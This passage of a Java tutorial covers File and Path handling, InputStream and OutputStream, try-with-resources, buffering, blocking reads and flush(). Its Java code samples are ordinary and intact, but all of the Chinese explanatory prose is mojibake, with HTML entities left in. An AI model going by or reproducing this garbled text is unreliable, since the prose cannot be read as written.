é™¤æ–‡ä»¶å½“Fileå¯¹è±¡è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå¯ä»¥é€šè¿‡createNewFile()åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œç”¨delete()åˆ é™¤è¯¥æ–‡ä»¶ï¼š File file = new File(&quot;/path/to/file&quot;); if (file.createNewFile()) { // æ–‡ä»¶åˆ›å»ºæˆåŠŸ: // TODO: if (file.delete()) { // åˆ é™¤æ–‡ä»¶æˆåŠŸ: } } æœ‰äº›æ—¶å€™ï¼Œç¨‹åºéœ€è¦è¯»å†™ä¸€äº›ä¸´æ—¶æ–‡ä»¶ï¼ŒFileå¯¹è±¡æä¾›äº†createTempFile()æ¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œä»¥åŠdeleteOnExit()åœ¨JVMé€€å‡ºæ—¶è‡ªåŠ¨åˆ é™¤è¯¥æ–‡ä»¶ã€‚ public class Main { public static void main(String[] args) throws IOException { File f = File.createTempFile(&quot;tmp-&quot;, &quot;.txt&quot;); // æä¾›ä¸´æ—¶æ–‡ä»¶çš„å‰ç¼€å’Œåç¼€ f.deleteOnExit(); // JVMé€€å‡ºæ—¶è‡ªåŠ¨åˆ é™¤ System.out.println(f.isFile()); System.out.println(f.getAbsolutePath()); } } éå†æ–‡ä»¶å’Œç›®å½•å½“Fileå¯¹è±¡è¡¨ç¤ºä¸€ä¸ªç›®å½•æ—¶ï¼Œå¯ä»¥ä½¿ç”¨list()å’ŒlistFiles()åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•åã€‚listFiles()æä¾›äº†ä¸€ç³»åˆ—é‡è½½æ–¹æ³•ï¼Œå¯ä»¥è¿‡æ»¤ä¸æƒ³è¦çš„æ–‡ä»¶å’Œç›®å½•ï¼š public class Main { public static void main(String[] args) throws IOException { File f = new File(&quot;C:\\\\Windows&quot;); File[] fs1 = f.listFiles(); // åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½• printFiles(fs1); File[] fs2 = f.listFiles(new FilenameFilter() { // ä»…åˆ—å‡º.exeæ–‡ä»¶ public boolean accept(File dir, String name) { return name.endsWith(&quot;.exe&quot;); // è¿”å›trueè¡¨ç¤ºæ¥å—è¯¥æ–‡ä»¶ } }); printFiles(fs2); } static void printFiles(File[] files) { System.out.println(&quot;==========&quot;); if (files != null) { for (File f : files) { System.out.println(f); } } System.out.println(&quot;==========&quot;); } } å’Œæ–‡ä»¶æ“ä½œç±»ä¼¼ï¼ŒFileå¯¹è±¡å¦‚æœè¡¨ç¤ºä¸€ä¸ªç›®å½•ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•åˆ›å»ºå’Œåˆ é™¤ç›®å½•ï¼š boolean mkdir()ï¼šåˆ›å»ºå½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•ï¼› boolean mkdirs()ï¼šåˆ›å»ºå½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•ï¼Œå¹¶åœ¨å¿…è¦æ—¶å°†ä¸å­˜åœ¨çš„çˆ¶ç›®å½•ä¹Ÿåˆ›å»ºå‡ºæ¥ï¼› boolean delete()ï¼šåˆ é™¤å½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•ï¼Œå½“å‰ç›®å½•å¿…é¡»ä¸ºç©ºæ‰èƒ½åˆ é™¤æˆåŠŸã€‚ PathJavaæ ‡å‡†åº“è¿˜æä¾›äº†ä¸€ä¸ªPathå¯¹è±¡ï¼Œå®ƒä½äºjava.nio.fileåŒ…ã€‚Pathå¯¹è±¡å’ŒFileå¯¹è±¡ç±»ä¼¼ï¼Œä½†æ“ä½œæ›´åŠ ç®€å•ï¼š import java.io.*; import java.nio.file.*; public class Main { public static void main(String[] args) throws IOException { Path p1 = Paths.get(&quot;.&quot;, &quot;project&quot;, &quot;study&quot;); // æ„é€ ä¸€ä¸ªPathå¯¹è±¡ System.out.println(p1);//// .\\project\\study Path p2 = p1.toAbsolutePath(); // è½¬æ¢ä¸ºç»å¯¹è·¯å¾„ System.out.println(p2);//// D:\\project\\login\\.\\project\\study Path p3 = p2.normalize(); // è½¬æ¢ä¸ºè§„èŒƒè·¯å¾„ System.out.println(p3);//// D:\\project\\login\\project\\study File f = p3.toFile(); // è½¬æ¢ä¸ºFileå¯¹è±¡ System.out.println(f);//// D:\\project\\login\\project\\study for (Path p : Paths.get(&quot;..&quot;).toAbsolutePath()) { // å¯ä»¥ç›´æ¥éå†Path System.out.println(&quot; &quot; + p); } } } å¦‚æœéœ€è¦å¯¹ç›®å½•è¿›è¡Œå¤æ‚çš„æ‹¼æ¥ã€éå†ç­‰æ“ä½œï¼Œä½¿ç”¨Pathå¯¹è±¡æ›´æ–¹ä¾¿ã€‚ å°ç»“Javaæ ‡å‡†åº“çš„java.io.Fileå¯¹è±¡è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶æˆ–è€…ç›®å½•ï¼š åˆ›å»ºFileå¯¹è±¡æœ¬èº«ä¸æ¶‰åŠIOæ“ä½œï¼› å¯ä»¥è·å–è·¯å¾„ï¼ç»å¯¹è·¯å¾„ï¼è§„èŒƒè·¯å¾„ï¼šgetPath()/getAbsolutePath()/getCanonicalPath()ï¼› å¯ä»¥è·å–ç›®å½•çš„æ–‡ä»¶å’Œå­ç›®å½•ï¼šlist()/listFiles()ï¼› å¯ä»¥åˆ›å»ºæˆ–åˆ é™¤æ–‡ä»¶å’Œç›®å½•ã€‚ InputStreamInputStreamå°±æ˜¯Javaæ ‡å‡†åº“æä¾›çš„æœ€åŸºæœ¬çš„è¾“å…¥æµã€‚å®ƒä½äºjava.ioè¿™ä¸ªåŒ…é‡Œã€‚java.ioåŒ…æä¾›äº†æ‰€æœ‰åŒæ­¥IOçš„åŠŸèƒ½ã€‚ è¦ç‰¹åˆ«æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼ŒInputStreamå¹¶ä¸æ˜¯ä¸€ä¸ªæ¥å£ï¼Œè€Œæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒæ˜¯æ‰€æœ‰è¾“å…¥æµçš„è¶…ç±»ã€‚è¿™ä¸ªæŠ½è±¡ç±»å®šä¹‰çš„ä¸€ä¸ªæœ€é‡è¦çš„æ–¹æ³•å°±æ˜¯int read()ï¼Œç­¾åå¦‚ä¸‹ï¼š public abstract int read() throws IOException; è¿™ä¸ªæ–¹æ³•ä¼šè¯»å–è¾“å…¥æµçš„ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶è¿”å›å­—èŠ‚è¡¨ç¤ºçš„intå€¼ï¼ˆ0~255ï¼‰ã€‚å¦‚æœå·²è¯»åˆ°æœ«å°¾ï¼Œè¿”å›-1è¡¨ç¤ºä¸èƒ½ç»§ç»­è¯»å–äº†ã€‚ FileInputStreamæ˜¯InputStreamçš„ä¸€ä¸ªå­ç±»ã€‚é¡¾åæ€ä¹‰ï¼ŒFileInputStreamå°±æ˜¯ä»æ–‡ä»¶æµä¸­è¯»å–æ•°æ®ã€‚ä¸‹é¢çš„ä»£ç æ¼”ç¤ºäº†å¦‚ä½•å®Œæ•´åœ°è¯»å–ä¸€ä¸ªFileInputStreamçš„æ‰€æœ‰å­—èŠ‚ï¼š public void readFile() throws IOException { // åˆ›å»ºä¸€ä¸ªFileInputStreamå¯¹è±¡: InputStream input = new FileInputStream(&quot;src/readme.txt&quot;); for (;;) { int n = input.read(); // åå¤è°ƒç”¨read()æ–¹æ³•ï¼Œç›´åˆ°è¿”å›-1 if (n == -1) { break; } System.out.println(n); // æ‰“å°byteçš„å€¼ } input.close(); // å…³é—­æµ } åœ¨è®¡ç®—æœºä¸­ï¼Œç±»ä¼¼æ–‡ä»¶ã€ç½‘ç»œç«¯å£è¿™äº›èµ„æºï¼Œéƒ½æ˜¯ç”±æ“ä½œç³»ç»Ÿç»Ÿä¸€ç®¡ç†çš„ã€‚åº”ç”¨ç¨‹åºåœ¨è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œè¯»å†™ï¼Œå®Œæˆåè¦åŠæ—¶åœ°å…³é—­ï¼Œä»¥ä¾¿è®©æ“ä½œç³»ç»ŸæŠŠèµ„æºé‡Šæ”¾æ‰ï¼Œå¦åˆ™ï¼Œåº”ç”¨ç¨‹åºå ç”¨çš„èµ„æºä¼šè¶Šæ¥è¶Šå¤šï¼Œä¸ä½†ç™½ç™½å ç”¨å†…å­˜ï¼Œè¿˜ä¼šå½±å“å…¶ä»–åº”ç”¨ç¨‹åºçš„è¿è¡Œã€‚ InputStreamå’ŒOutputStreaméƒ½æ˜¯é€šè¿‡close()æ–¹æ³•æ¥å…³é—­æµã€‚å…³é—­æµå°±ä¼šé‡Šæ”¾å¯¹åº”çš„åº•å±‚èµ„æºã€‚ æˆ‘ä»¬è¿˜è¦æ³¨æ„åˆ°åœ¨è¯»å–æˆ–å†™å…¥IOæµçš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šå‘ç”Ÿé”™è¯¯ï¼Œä¾‹å¦‚ï¼Œæ–‡ä»¶ä¸å­˜åœ¨å¯¼è‡´æ— æ³•è¯»å–ï¼Œæ²¡æœ‰å†™æƒé™å¯¼è‡´å†™å…¥å¤±è´¥ï¼Œç­‰ç­‰ï¼Œè¿™äº›åº•å±‚é”™è¯¯ç”±Javaè™šæ‹Ÿæœºè‡ªåŠ¨å°è£…æˆIOExceptionå¼‚å¸¸å¹¶æŠ›å‡ºã€‚å› æ­¤ï¼Œæ‰€æœ‰ä¸IOæ“ä½œç›¸å…³çš„ä»£ç éƒ½å¿…é¡»æ­£ç¡®å¤„ç†IOExceptionã€‚ ä»”ç»†è§‚å¯Ÿä¸Šé¢çš„ä»£ç ï¼Œä¼šå‘ç°ä¸€ä¸ªæ½œåœ¨çš„é—®é¢˜ï¼šå¦‚æœè¯»å–è¿‡ç¨‹ä¸­å‘ç”Ÿäº†IOé”™è¯¯ï¼ŒInputStreamå°±æ²¡æ³•æ­£ç¡®åœ°å…³é—­ï¼Œèµ„æºä¹Ÿå°±æ²¡æ³•åŠæ—¶é‡Šæ”¾ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ç”¨try ... finallyæ¥ä¿è¯InputStreamåœ¨æ— è®ºæ˜¯å¦å‘ç”ŸIOé”™è¯¯çš„æ—¶å€™éƒ½èƒ½å¤Ÿæ­£ç¡®åœ°å…³é—­ï¼š public void readFile() throws IOException { InputStream input = null; try { input = new FileInputStream(&quot;src/readme.txt&quot;); int n; while ((n = input.read()) != -1) { // åˆ©ç”¨whileåŒæ—¶è¯»å–å¹¶åˆ¤æ–­ System.out.println(n); } } finally { if (input != null) { input.close(); } } } ç”¨try ... finallyæ¥ç¼–å†™ä¸Šè¿°ä»£ç ä¼šæ„Ÿè§‰æ¯”è¾ƒå¤æ‚ï¼Œæ›´å¥½çš„å†™æ³•æ˜¯åˆ©ç”¨Java 7å¼•å…¥çš„æ–°çš„try(resource)çš„è¯­æ³•ï¼Œåªéœ€è¦ç¼–å†™tryè¯­å¥ï¼Œè®©ç¼–è¯‘å™¨è‡ªåŠ¨ä¸ºæˆ‘ä»¬å…³é—­èµ„æºã€‚æ¨èçš„å†™æ³•å¦‚ä¸‹ï¼š public void readFile() throws IOException { try (InputStream input = new FileInputStream(&quot;src/readme.txt&quot;)) { int n; while ((n = input.read()) != -1) { System.out.println(n); } } // ç¼–è¯‘å™¨åœ¨æ­¤è‡ªåŠ¨ä¸ºæˆ‘ä»¬å†™å…¥finallyå¹¶è°ƒç”¨close() } å®é™…ä¸Šï¼Œç¼–è¯‘å™¨å¹¶ä¸ä¼šç‰¹åˆ«åœ°ä¸ºInputStreamåŠ ä¸Šè‡ªåŠ¨å…³é—­ã€‚ç¼–è¯‘å™¨åªçœ‹try(resource = ...)ä¸­çš„å¯¹è±¡æ˜¯å¦å®ç°äº†java.lang.AutoCloseableæ¥å£ï¼Œå¦‚æœå®ç°äº†ï¼Œå°±è‡ªåŠ¨åŠ ä¸Šfinallyè¯­å¥å¹¶è°ƒç”¨close()æ–¹æ³•ã€‚InputStreamå’ŒOutputStreaméƒ½å®ç°äº†è¿™ä¸ªæ¥å£ï¼Œå› æ­¤ï¼Œéƒ½å¯ä»¥ç”¨åœ¨try(resource)ä¸­ã€‚ ç¼“å†²åœ¨è¯»å–æµçš„æ—¶å€™ï¼Œä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—èŠ‚å¹¶ä¸æ˜¯æœ€é«˜æ•ˆçš„æ–¹æ³•ã€‚å¾ˆå¤šæµæ”¯æŒä¸€æ¬¡æ€§è¯»å–å¤šä¸ªå­—èŠ‚åˆ°ç¼“å†²åŒºï¼Œå¯¹äºæ–‡ä»¶å’Œç½‘ç»œæµæ¥è¯´ï¼Œåˆ©ç”¨ç¼“å†²åŒºä¸€æ¬¡æ€§è¯»å–å¤šä¸ªå­—èŠ‚æ•ˆç‡å¾€å¾€è¦é«˜å¾ˆå¤šã€‚InputStreamæä¾›äº†ä¸¤ä¸ªé‡è½½æ–¹æ³•æ¥æ”¯æŒè¯»å–å¤šä¸ªå­—èŠ‚ï¼š int read(byte[] b)ï¼šè¯»å–è‹¥å¹²å­—èŠ‚å¹¶å¡«å……åˆ°byte[]æ•°ç»„ï¼Œè¿”å›è¯»å–çš„å­—èŠ‚æ•° int read(byte[] b, int off, int len)ï¼šæŒ‡å®šbyte[]æ•°ç»„çš„åç§»é‡å’Œæœ€å¤§å¡«å……æ•° åˆ©ç”¨ä¸Šè¿°æ–¹æ³•ä¸€æ¬¡è¯»å–å¤šä¸ªå­—èŠ‚æ—¶ï¼Œéœ€è¦å…ˆå®šä¹‰ä¸€ä¸ªbyte[]æ•°ç»„ä½œä¸ºç¼“å†²åŒºï¼Œread()æ–¹æ³•ä¼šå°½å¯èƒ½å¤šåœ°è¯»å–å­—èŠ‚åˆ°ç¼“å†²åŒºï¼Œ ä½†ä¸ä¼šè¶…è¿‡ç¼“å†²åŒºçš„å¤§å°ã€‚read()æ–¹æ³•çš„è¿”å›å€¼ä¸å†æ˜¯å­—èŠ‚çš„intå€¼ï¼Œè€Œæ˜¯è¿”å›å®é™…è¯»å–äº†å¤šå°‘ä¸ªå­—èŠ‚ã€‚å¦‚æœè¿”å›-1ï¼Œè¡¨ç¤ºæ²¡æœ‰æ›´å¤šçš„æ•°æ®äº†ã€‚ åˆ©ç”¨ç¼“å†²åŒºä¸€æ¬¡è¯»å–å¤šä¸ªå­—èŠ‚çš„ä»£ç å¦‚ä¸‹ï¼š public void readFile() throws IOException { try (InputStream input = new FileInputStream(&quot;src/readme.txt&quot;)) { // å®šä¹‰1000ä¸ªå­—èŠ‚å¤§å°çš„ç¼“å†²åŒº: byte[] buffer = new byte[1000]; int n; while ((n = input.read(buffer)) != -1) { // è¯»å–åˆ°ç¼“å†²åŒº System.out.println(&quot;read &quot; + n + &quot; bytes.&quot;); } } } é˜»å¡åœ¨è°ƒç”¨InputStreamçš„read()æ–¹æ³•è¯»å–æ•°æ®æ—¶ï¼Œæˆ‘ä»¬è¯´read()æ–¹æ³•æ˜¯é˜»å¡ï¼ˆBlockingï¼‰çš„ã€‚å®ƒçš„æ„æ€æ˜¯ï¼Œå¯¹äºä¸‹é¢çš„ä»£ç ï¼š int n; n = input.read(); // å¿…é¡»ç­‰å¾…read()æ–¹æ³•è¿”å›æ‰èƒ½æ‰§è¡Œä¸‹ä¸€è¡Œä»£ç  int m = n; æ‰§è¡Œåˆ°ç¬¬äºŒè¡Œä»£ç æ—¶ï¼Œå¿…é¡»ç­‰read()æ–¹æ³•è¿”å›åæ‰èƒ½ç»§ç»­ã€‚å› ä¸ºè¯»å–IOæµç›¸æ¯”æ‰§è¡Œæ™®é€šä»£ç ï¼Œé€Ÿåº¦ä¼šæ…¢å¾ˆå¤šï¼Œå› æ­¤ï¼Œæ— æ³•ç¡®å®šread()æ–¹æ³•è°ƒç”¨åˆ°åº•è¦èŠ±è´¹å¤šé•¿æ—¶é—´ã€‚ InputStreamå®ç°ç±»ç”¨FileInputStreamå¯ä»¥ä»æ–‡ä»¶è·å–è¾“å…¥æµï¼Œè¿™æ˜¯InputStreamå¸¸ç”¨çš„ä¸€ä¸ªå®ç°ç±»ã€‚æ­¤å¤–ï¼ŒByteArrayInputStreamå¯ä»¥åœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ªInputStreamï¼š import java.io.*; public class Main { public static void main(String[] args) throws IOException { byte[] data = { 72, 101, 108, 108, 111, 33 }; try (InputStream input = new ByteArrayInputStream(data)) { int n; while ((n = input.read()) != -1) { System.out.println((char)n); } } } } ByteArrayInputStreamå®é™…ä¸Šæ˜¯æŠŠä¸€ä¸ªbyte[]æ•°ç»„åœ¨å†…å­˜ä¸­å˜æˆä¸€ä¸ªInputStreamï¼Œè™½ç„¶å®é™…åº”ç”¨ä¸å¤šï¼Œä½†æµ‹è¯•çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨å®ƒæ¥æ„é€ ä¸€ä¸ªInputStreamã€‚ ä¸¾ä¸ªæ —å­ï¼šæˆ‘ä»¬æƒ³ä»æ–‡ä»¶ä¸­è¯»å–æ‰€æœ‰å­—èŠ‚ï¼Œå¹¶è½¬æ¢æˆcharç„¶åæ‹¼æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥è¿™ä¹ˆå†™ï¼š public class Main { public static void main(String[] args) throws IOException { String s; try (InputStream input = new FileInputStream(&quot;C:\\\\test\\\\README.txt&quot;)) { int n; StringBuilder sb = new StringBuilder(); while ((n = input.read()) != -1) { sb.append((char) n); } s = sb.toString(); } System.out.println(s); } } è¦æµ‹è¯•ä¸Šé¢çš„ç¨‹åºï¼Œå°±çœŸçš„éœ€è¦åœ¨æœ¬åœ°ç¡¬ç›˜ä¸Šæ”¾ä¸€ä¸ªçœŸå®çš„æ–‡æœ¬æ–‡ä»¶ã€‚å¦‚æœæˆ‘ä»¬æŠŠä»£ç ç¨å¾®æ”¹é€ ä¸€ä¸‹ï¼Œæå–ä¸€ä¸ªreadAsString()çš„æ–¹æ³•ï¼š public class Main { public static void main(String[] args) throws IOException { String s; try (InputStream input = new FileInputStream(&quot;C:\\\\test\\\\README.txt&quot;)) { s = readAsString(input); } System.out.println(s); } public static String readAsString(InputStream input) throws IOException { int n; StringBuilder sb = new StringBuilder(); while ((n = input.read()) != -1) { sb.append((char) n); } return sb.toString(); } } å¯¹è¿™ä¸ªString readAsString(InputStream input)æ–¹æ³•è¿›è¡Œæµ‹è¯•å°±ç›¸å½“ç®€å•ï¼Œå› ä¸ºä¸ä¸€å®šè¦ä¼ å…¥ä¸€ä¸ªçœŸçš„FileInputStreamï¼š import java.io.*; public class Main { public static void main(String[] args) throws IOException { byte[] data = { 72, 101, 108, 108, 111, 33 }; try (InputStream input = new ByteArrayInputStream(data)) { String s = readAsString(input); System.out.println(s); } } public static String readAsString(InputStream input) throws IOException { int n; StringBuilder sb = new StringBuilder(); while ((n = input.read()) != -1) { sb.append((char) n); } return sb.toString(); } } è¿™å°±æ˜¯é¢å‘æŠ½è±¡ç¼–ç¨‹åŸåˆ™çš„åº”ç”¨ï¼šæ¥å—InputStreamæŠ½è±¡ç±»å‹ï¼Œè€Œä¸æ˜¯å…·ä½“çš„FileInputStreamç±»å‹ï¼Œä»è€Œä½¿å¾—ä»£ç å¯ä»¥å¤„ç†InputStreamçš„ä»»æ„å®ç°ç±»ã€‚ å°ç»“Javaæ ‡å‡†åº“çš„java.io.InputStreamå®šä¹‰äº†æ‰€æœ‰è¾“å…¥æµçš„è¶…ç±»ï¼š FileInputStreamå®ç°äº†æ–‡ä»¶æµè¾“å…¥ï¼› ByteArrayInputStreamåœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ªå­—èŠ‚æµè¾“å…¥ã€‚ æ€»æ˜¯ä½¿ç”¨try(resource)æ¥ä¿è¯InputStreamæ­£ç¡®å…³é—­ã€‚ OutputStreamå’ŒInputStreamç›¸åï¼ŒOutputStreamæ˜¯Javaæ ‡å‡†åº“æä¾›çš„æœ€åŸºæœ¬çš„è¾“å‡ºæµã€‚ å’ŒInputStreamç±»ä¼¼ï¼ŒOutputStreamä¹Ÿæ˜¯æŠ½è±¡ç±»ï¼Œå®ƒæ˜¯æ‰€æœ‰è¾“å‡ºæµçš„è¶…ç±»ã€‚è¿™ä¸ªæŠ½è±¡ç±»å®šä¹‰çš„ä¸€ä¸ªæœ€é‡è¦çš„æ–¹æ³•å°±æ˜¯void write(int b)ï¼Œç­¾åå¦‚ä¸‹ï¼š public abstract void write(int b) throws IOException; è¿™ä¸ªæ–¹æ³•ä¼šå†™å…¥ä¸€ä¸ªå­—èŠ‚åˆ°è¾“å‡ºæµã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ä¼ å…¥çš„æ˜¯intå‚æ•°ï¼Œä½†åªä¼šå†™å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå³åªå†™å…¥intæœ€ä½8ä½è¡¨ç¤ºå­—èŠ‚çš„éƒ¨åˆ†ï¼ˆç›¸å½“äºb &amp; 0xffï¼‰ã€‚ å’ŒInputStreamç±»ä¼¼ï¼ŒOutputStreamä¹Ÿæä¾›äº†close()æ–¹æ³•å…³é—­è¾“å‡ºæµï¼Œä»¥ä¾¿é‡Šæ”¾ç³»ç»Ÿèµ„æºã€‚è¦ç‰¹åˆ«æ³¨æ„ï¼šOutputStreamè¿˜æä¾›äº†ä¸€ä¸ªflush()æ–¹æ³•ï¼Œå®ƒçš„ç›®çš„æ˜¯å°†ç¼“å†²åŒºçš„å†…å®¹çœŸæ­£è¾“å‡ºåˆ°ç›®çš„åœ°ã€‚ ä¸ºä»€ä¹ˆè¦æœ‰flush()ï¼Ÿå› ä¸ºå‘ç£ç›˜ã€ç½‘ç»œå†™å…¥æ•°æ®çš„æ—¶å€™ï¼Œå‡ºäºæ•ˆç‡çš„è€ƒè™‘ï¼Œæ“ä½œç³»ç»Ÿå¹¶ä¸æ˜¯è¾“å‡ºä¸€ä¸ªå­—èŠ‚å°±ç«‹åˆ»å†™å…¥åˆ°æ–‡ä»¶æˆ–è€…å‘é€åˆ°ç½‘ç»œï¼Œè€Œæ˜¯æŠŠè¾“å‡ºçš„å­—èŠ‚å…ˆæ”¾åˆ°å†…å­˜çš„ä¸€ä¸ªç¼“å†²åŒºé‡Œï¼ˆæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªbyte[]æ•°ç»„ï¼‰ï¼Œç­‰åˆ°ç¼“å†²åŒºå†™æ»¡äº†ï¼Œå†ä¸€æ¬¡æ€§å†™å…¥æ–‡ä»¶æˆ–è€…ç½‘ç»œã€‚å¯¹äºå¾ˆå¤šIOè®¾å¤‡æ¥è¯´ï¼Œä¸€æ¬¡å†™ä¸€ä¸ªå­—èŠ‚å’Œä¸€æ¬¡å†™1000ä¸ªå­—èŠ‚ï¼ŒèŠ±è´¹çš„æ—¶é—´å‡ ä¹æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œæ‰€ä»¥OutputStreamæœ‰ä¸ªflush()æ–¹æ³•ï¼Œèƒ½å¼ºåˆ¶æŠŠç¼“å†²åŒºå†…å®¹è¾“å‡ºã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸éœ€è¦è°ƒç”¨è¿™ä¸ªflush()æ–¹æ³•ï¼Œå› ä¸ºç¼“å†²åŒºå†™æ»¡äº†OutputStreamä¼šè‡ªåŠ¨è°ƒç”¨å®ƒï¼Œå¹¶ä¸”ï¼Œåœ¨è°ƒç”¨close()æ–¹æ³•å…³é—­OutputStreamä¹‹å‰ï¼Œä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨flush()æ–¹æ³•ã€‚ ä½†æ˜¯ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨è°ƒç”¨flush()æ–¹æ³•ã€‚ä¸¾ä¸ªæ —å­ï¼š å°æ˜æ­£åœ¨å¼€å‘ä¸€æ¬¾åœ¨çº¿èŠå¤©è½¯ä»¶ï¼Œå½“ç”¨æˆ·è¾“å…¥ä¸€å¥è¯åï¼Œå°±é€šè¿‡OutputStreamçš„write()æ–¹æ³•å†™å…¥ç½‘ç»œæµã€‚å°æ˜æµ‹è¯•çš„æ—¶å€™å‘ç°ï¼Œå‘é€æ–¹è¾“å…¥åï¼Œæ¥æ”¶æ–¹æ ¹æœ¬æ”¶ä¸åˆ°ä»»ä½•ä¿¡æ¯ï¼Œæ€ä¹ˆè‚¥å››ï¼Ÿ åŸå› å°±åœ¨äºå†™å…¥ç½‘ç»œæµæ˜¯å…ˆå†™å…¥å†…å­˜ç¼“å†²åŒºï¼Œç­‰ç¼“å†²åŒºæ»¡äº†æ‰ä¼šä¸€æ¬¡æ€§å‘é€åˆ°ç½‘ç»œã€‚å¦‚æœç¼“å†²åŒºå¤§å°æ˜¯4Kï¼Œåˆ™å‘é€æ–¹è¦æ•²å‡ åƒä¸ªå­—ç¬¦åï¼Œæ“ä½œç³»ç»Ÿæ‰ä¼šæŠŠç¼“å†²åŒºçš„å†…å®¹å‘é€å‡ºå»ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæ¥æ”¶æ–¹ä¼šä¸€æ¬¡æ€§æ”¶åˆ°å¤§é‡æ¶ˆæ¯ã€‚ è§£å†³åŠæ³•å°±æ˜¯æ¯è¾“å…¥ä¸€å¥è¯åï¼Œç«‹åˆ»è°ƒç”¨flush()ï¼Œä¸ç®¡å½“å‰ç¼“å†²åŒºæ˜¯å¦å·²æ»¡ï¼Œå¼ºè¿«æ“ä½œç³»ç»ŸæŠŠç¼“å†²åŒºçš„å†…å®¹ç«‹åˆ»å‘é€å‡ºå»ã€‚ å®é™…ä¸Šï¼ŒInputStreamä¹Ÿæœ‰ç¼“å†²åŒºã€‚ä¾‹å¦‚ï¼Œä»FileInputStreamè¯»å–ä¸€ä¸ªå­—èŠ‚æ—¶ï¼Œæ“ä½œç³»ç»Ÿå¾€å¾€ä¼šä¸€æ¬¡æ€§è¯»å–è‹¥å¹²å­—èŠ‚åˆ°ç¼“å†²åŒºï¼Œå¹¶ç»´æŠ¤ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æœªè¯»çš„ç¼“å†²åŒºã€‚ç„¶åï¼Œæ¯æ¬¡æˆ‘ä»¬è°ƒç”¨int read()è¯»å–ä¸‹ä¸€ä¸ªå­—èŠ‚æ—¶ï¼Œå¯ä»¥ç›´æ¥è¿”å›ç¼“å†²åŒºçš„ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œé¿å…æ¯æ¬¡è¯»ä¸€ä¸ªå­—èŠ‚éƒ½å¯¼è‡´IOæ“ä½œã€‚å½“ç¼“å†²åŒºå…¨éƒ¨è¯»å®Œåç»§ç»­è°ƒç”¨read()ï¼Œåˆ™ä¼šè§¦å‘æ“ä½œç³»ç»Ÿçš„ä¸‹ä¸€æ¬¡è¯»å–å¹¶å†æ¬¡å¡«æ»¡ç¼“å†²åŒºã€‚ FileOutputStreamæˆ‘ä»¬ä»¥FileOutputStreamä¸ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•å°†è‹¥å¹²ä¸ªå­—èŠ‚å†™å…¥æ–‡ä»¶æµï¼š public void writeFile() throws IOException { OutputStream output = new FileOutputStream(&quot;out/readme.txt&quot;); output.write(72); // H output.write(101); // e output.write(108); // l output.write(108); // l output.write(111); // o output.close(); } æ¯æ¬¡å†™å…¥ä¸€ä¸ªå­—èŠ‚éå¸¸éº»çƒ¦ï¼Œæ›´å¸¸è§çš„æ–¹æ³•æ˜¯ä¸€æ¬¡æ€§å†™å…¥è‹¥å¹²å­—èŠ‚ã€‚è¿™æ—¶ï¼Œå¯ä»¥ç”¨OutputStreamæä¾›çš„é‡è½½æ–¹æ³•void write(byte[])æ¥å®ç°ï¼š public void writeFile() throws IOException { OutputStream output = new FileOutputStream(&quot;out/readme.txt&quot;); output.write(&quot;Hello&quot;.getBytes(&quot;UTF-8&quot;)); // Hello output.close(); } å’ŒInputStreamä¸€æ ·ï¼Œä¸Šè¿°ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°åœ¨å‘ç”Ÿå¼‚å¸¸çš„æƒ…å†µä¸‹å¦‚ä½•æ­£ç¡®åœ°å…³é—­èµ„æºã€‚å†™å…¥è¿‡ç¨‹ä¹Ÿä¼šç»å¸¸å‘ç”ŸIOé”™è¯¯ï¼Œä¾‹å¦‚ï¼Œç£ç›˜å·²æ»¡ï¼Œæ— æƒé™å†™å…¥ç­‰ç­‰ã€‚æˆ‘ä»¬éœ€è¦ç”¨try(resource)æ¥ä¿è¯OutputStreamåœ¨æ— è®ºæ˜¯å¦å‘ç”ŸIOé”™è¯¯çš„æ—¶å€™éƒ½èƒ½å¤Ÿæ­£ç¡®åœ°å…³é—­ï¼š public void writeFile() throws IOException { try (OutputStream output = new FileOutputStream(&quot;out/readme.txt&quot;)) { output.write(&quot;Hello&quot;.getBytes(&quot;UTF-8&quot;)); // Hello } // ç¼–è¯‘å™¨åœ¨æ­¤è‡ªåŠ¨ä¸ºæˆ‘ä»¬å†™å…¥finallyå¹¶è°ƒç”¨close() } é˜»å¡å’ŒInputStreamä¸€æ 